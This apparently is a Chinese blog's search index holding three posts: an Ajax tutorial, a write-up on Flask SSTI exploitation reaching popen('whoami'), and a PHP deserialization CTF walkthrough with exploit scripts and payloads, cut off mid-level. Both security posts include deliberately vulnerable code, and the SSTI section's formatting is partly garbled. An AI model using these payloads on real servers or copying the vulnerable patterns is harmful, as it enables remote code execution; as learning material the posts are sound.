<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ajax技术-前后端交互</title>
      <link href="/posts/98d7f58f/"/>
      <url>/posts/98d7f58f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Ajax 并不是一门编程语言，而是一种前后端交互的技术</p></blockquote><h1 id="什么是-Ajax"><a href="#什么是-Ajax" class="headerlink" title="什么是 Ajax"></a>什么是 Ajax</h1><p>通过在后台与服务器进行少量数据交换，Ajax 可以使用网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p><h1 id="Ajax-实例"><a href="#Ajax-实例" class="headerlink" title="Ajax 实例"></a>Ajax 实例</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadXMlDoc</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment">// Ajax 脚本执行</span><br>&#125;<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><h2 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h2><p>所有现代浏览器均支持 XMLHttpRequest 对象</p><p>XMLHttpRequest 用于在后台与服务器进行数据交换</p><h2 id="创建-XMLHttpRequest-对象"><a href="#创建-XMLHttpRequest-对象" class="headerlink" title="创建 XMLHttpRequest 对象"></a>创建 XMLHttpRequest 对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br></code></pre></td></tr></table></figure><h2 id="Ajax-向服务器发出请求"><a href="#Ajax-向服务器发出请求" class="headerlink" title="Ajax 向服务器发出请求"></a>Ajax 向服务器发出请求</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>open(method,url,async)<ul><li>method：请求的类型 GET 或 POST</li><li>url ： 文件在服务器上的位置</li><li>async：true（异步）或 false （同步）</li></ul></li><li>send(string)<ul><li>string 仅用于 POST 请求</li></ul></li></ul><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.php?id=1&quot;</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><h3 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST <strong>请求</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;test.php&quot;</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>xmlhttp.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;name=lixiney&amp;password=hello&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>setRequestHeader(header,value)<ul><li>header 请求头</li><li>请求头的值</li></ul></li></ul><h3 id="Async-true"><a href="#Async-true" class="headerlink" title="Async&#x3D;true"></a>Async&#x3D;true</h3><p>当 async &#x3D; true 时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">loadXMLDoc</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; xmlhttp.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;myDiv&quot;</span>).<span class="hljs-property">innerHTML</span>=xmlhttp.<span class="hljs-property">responseText</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.php&quot;</span>,<span class="hljs-literal">true</span>);</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Ajax-服务器的响应"><a href="#Ajax-服务器的响应" class="headerlink" title="Ajax 服务器的响应"></a>Ajax 服务器的响应</h2><h3 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h3><ul><li>responseText<ul><li>获得字符串形式的响应数据</li></ul></li><li>responseXML<ul><li>获得XML形式的响应数据</li></ul></li></ul><h2 id="Ajax-onreadystatechange-事件"><a href="#Ajax-onreadystatechange-事件" class="headerlink" title="Ajax - onreadystatechange 事件"></a>Ajax - onreadystatechange 事件</h2><p>当请求被发送到服务器时，我们需要执行基于响应的任务。</p><p>每当 readyState 改变时，就会出发 onreadystatechange 事件。</p><ul><li>readyState 属性存有 XMLHttpRequest 的状态信息<ul><li>0 :  请求未初始化</li><li>1：服务器连接已建立</li><li>2：请求已接收</li><li>3：请求处理中</li><li>4：请求已完成，且响应就绪</li></ul></li><li>status <ul><li>200 : OK</li><li>404：未找到页面</li><li>其他状态码： <a href="https://www.runoob.com/http/http-status-codes.html">https://www.runoob.com/http/http-status-codes.html</a></li></ul></li></ul><h2 id="Ajax-Json"><a href="#Ajax-Json" class="headerlink" title="Ajax - Json"></a>Ajax - Json</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">putJson</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">status</span> == <span class="hljs-number">200</span> &amp;&amp; xmlhttp.<span class="hljs-property">readyState</span> ==<span class="hljs-number">4</span>)&#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> myArr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);</span><br><span class="language-javascript">                <span class="hljs-title function_">myFunc</span>(myArr);</span><br><span class="language-javascript">           &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.json&quot;</span>,<span class="hljs-literal">true</span>);</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunc</span>(<span class="hljs-params">arr</span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> out = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> i;</span><br><span class="language-javascript">        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;arr.<span class="hljs-property">length</span>;i++)&#123;</span><br><span class="language-javascript">out += <span class="hljs-string">&#x27;a&lt; href=&quot;&#x27;</span>+arr[i].<span class="hljs-property">url</span>+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>+arr[i].<span class="hljs-property">title</span>+<span class="hljs-string">&#x27;&lt;/a&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myDiv&#x27;</span>).<span class="hljs-property">innerHTML</span>=out;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JavaScript 教程&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/js/&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HTML 教程&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/html/&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CSS 教程&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/css/&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入漏洞</title>
      <link href="/posts/2dff4083/"/>
      <url>/posts/2dff4083/</url>
      
        <content type="html"><![CDATA[<h1 id="ssti漏洞的成因与危害"><a href="#ssti漏洞的成因与危害" class="headerlink" title="ssti漏洞的成因与危害"></a>ssti漏洞的成因与危害</h1><blockquote><p>当服务端接受了用户的恶意代码，未经任何处理就将其应用在web应用模板的部分上，服务端在渲染这些模板时，执行了这些恶意代码，可能导致getshell 代码执行 敏感信息泄露等安全问题</p></blockquote><p>一个简单的漏洞代码实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string,request<br><br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&quot;name&quot;</span>)<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">f&quot;Hello <span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-built_in">str</span>,name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>使用 <code>&#123;&#123;1-2&#125;&#125;</code> 测试，发现代码被执行</p><p><img src="/posts/2dff4083/image-20250813160700465.png" alt="image-20250813160700465"></p><p>注意！</p><blockquote><p>这里的运算符号不能是 + 号，因为在url编码中+号做为空格使用</p></blockquote><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="从一个字符串或者列表对象中获取其类"><a href="#从一个字符串或者列表对象中获取其类" class="headerlink" title="从一个字符串或者列表对象中获取其类"></a>从一个字符串或者列表对象中获取其类</h2><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span><br></code></pre></td></tr></table></figure><h2 id="获取基类，使用-这个类"><a href="#获取基类，使用-这个类" class="headerlink" title="获取基类，使用&lt;class ‘object’&gt; 这个类"></a>获取基类，使用&lt;class ‘object’&gt; 这个类</h2><ul><li><pre><code class="hljs">  &#39;&#39;.__class__.__bases__  <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><br>* ```<br>    <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span><br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="hljs">  &#39;&#39;.__class__.__base__  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>    <br><br>![image-<span class="hljs-number">20250813163526166</span>](.<span class="hljs-regexp">/SSTI模板注入漏洞/im</span>age-<span class="hljs-number">20250813163526166</span>.png)<br><br>这里要使用 &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;  这个类 可以使用下标表示<br><br></code></pre></td></tr></table></figure>&#39;&#39;.__class__.__mro__[1]</code></pre></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br><br>## 获取 object 类下面的所有子类<br><br></code></pre></td></tr></table></figure><p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><br> 获取到之后选择合适的类，这里可以使用&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span>&gt;这个类<br><br>比如在列表的第<span class="hljs-number">117</span>行，可以这样写<br><br></code></pre></td></tr></table></figure><p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[117]</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br><br>## 初始化类，获取全局方法，变量以及参数<br><br></code></pre></td></tr></table></figure><p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[117].<strong>init</strong>.<strong>globals</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br><br><br>## 执行系统命令<br><br>使用 <span class="hljs-built_in">popen</span>()  + <span class="hljs-built_in">read</span>() 方法可以返回执行后的结果<br><br></code></pre></td></tr></table></figure><p>‘’.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[117].<strong>init</strong>.<strong>globals</strong><a href="'whoami'">‘popen’</a>.read()</p><pre><code class="hljs"></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计-反序列化漏洞</title>
      <link href="/posts/bcdf8f30/"/>
      <url>/posts/bcdf8f30/</url>
      
        <content type="html"><![CDATA[<blockquote><p>所有的 flag 均在 flag.php 的 $flag 变量中</p></blockquote><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">action</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>eval函数为代码执行函数，将字符串作为php代码执行，已知 flag 在 flag.php 文件中，先将 flag.php 文件包含进来，再对 flag 变量进行输出</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> a;<br><span class="hljs-variable">$test</span>-&gt;act = <span class="hljs-string">&#x27;include(&quot;flag.php&quot;);echo $flag;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>)<br></code></pre></td></tr></table></figure><p>生成的payload：</p><blockquote><p>O:1:”a”:1:{s:3:”act”;s:31:”include(“flag.php”);echo $flag;”;}</p></blockquote><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>login 方法中校验 user 和 pass 的值，如果返回结果为真，则输出 $flag</p><p>__construct 初始化方法</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mylogin</span>(<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-string">&quot;ok&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><blockquote><p>O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p></blockquote><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())<br>&#123;<br>    <span class="hljs-keyword">echo</span> 